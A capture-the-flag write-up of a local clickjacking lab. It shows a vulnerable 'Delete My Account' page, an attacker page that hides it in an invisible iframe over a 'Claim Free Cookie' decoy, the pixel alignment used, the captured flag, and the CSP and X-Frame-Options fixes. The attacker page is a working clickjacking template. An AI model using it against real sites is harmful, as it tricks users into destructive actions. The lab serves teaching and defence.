# CTF Writeup: Clickjacking Practice Lab

## Challenge Description
The objective of this challenge is to exploit a clickjacking vulnerability on a local web application. By embedding a vulnerable target page inside an invisible `<iframe>` and aligning it over a decoy website, a user can be tricked into performing a sensitive transaction ("Delete Account") while intending to click an innocent button ("Claim Free Cookie").

---

## 🛠️ Environment Setup

### 1. Target Application (`victim.html`)
This represents the vulnerable banking application containing the high-value target action.
```html
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Banking App</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        .btn-danger { background-color: red; color: white; padding: 15px 30px; border: none; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <h2>Welcome back, User!</h2>
    <p>Manage your account settings below.</p>
    <button class="btn-danger" onclick="alert('CONGRATS! Here is your flag: FLAG{m4st3r_0f_1fr4m3_4l1gnm3nt}')">Delete My Account</button>
</body>
</html>
```

### 2. Malicious Exploit Page (`attacker.html`)
This is the delivery mechanism hosted by the attacker. It layers a decoy button beneath the target application's iframe using `z-index`.
```html
<!DOCTYPE html>
<html>
<head>
    <title>Win Free Prizes!</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
        
        #decoy-layer {
            position: absolute;
            top: 100px;
            left: 50px;
            z-index: 1;
        }
        #decoy-button {
            background-color: green;
            color: white;
            padding: 15px 40px;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }

        #target-iframe {
            position: absolute;
            top: 28px;   /* Custom alignment value */
            left: 38px;  /* Custom alignment value */
            width: 500px;
            height: 300px;
            border: 2px dashed gray; 
            z-index: 2; 
            opacity: 0.0; /* Fully invisible to arm the exploit */
        }
    </style>
</head>
<body>
    <div id="decoy-layer">
        <h1>Congratulations! You Won!</h1>
        <button id="decoy-button">Claim Free Cookie</button>
    </div>
    <iframe id="target-iframe" src="victim.html"></iframe>
</body>
</html>
```

---

## 🚀 Exploitation Steps

### Step 1: Spin up the Local Server
Because modern web browsers restrict cross-origin iframe actions via the `file://` protocol, the application files must be served over HTTP. 
```bash
PS C:\Users\Acer Nitro\OneDrive\Desktop\CTF\CTF\clickjacking-lab> python -m http.server 8000
Serving HTTP on :: port 8000 (http://::) ...
```

### Step 2: Pixel Alignment (UI Redirection)
1. Opened the browser and navigated to `http://localhost:8000/attacker.html`.
2. Kept `opacity` at `0.4` initially to visualize the layout.
3. Fine-tuned the placement of the hidden iframe so the red **"Delete My Account"** button stacked perfectly over the green **"Claim Free Cookie"** button.
4. **Discovered Working Coordinates:** 
   * `top: 28px;`
   * `left: 38px;`

### Step 3: Triggering the Exploit (Capturing the Flag)
1. Set the iframe `#target-iframe { opacity: 0.0; }` to make the target banking app completely hidden from the victim's view.
2. Refreshed the page and clicked the visible green **"Claim Free Cookie"** button.
3. The browser intercepted the click on the invisible upper layer (`z-index: 2`), executing the victim application's JavaScript alert and successfully printing the flag:
   
   > **`CONGRATS! Here is your flag: FLAG{m4st3r_0f_1fr4m3_4l1gnm3nt}`**

---

## 🛡️ Remediation Notes
To secure the application against this specific vulnerability, the server hosting `victim.html` must implement one of the following defensive configurations:
* **Content Security Policy (CSP):** Deliver the HTTP header `Content-Security-Policy: frame-ancestors 'none';` to completely stop other sites from framing it.
* **X-Frame-Options:** Deploy the legacy HTTP response header `X-Frame-Options: DENY` or `SAMEORIGIN`.
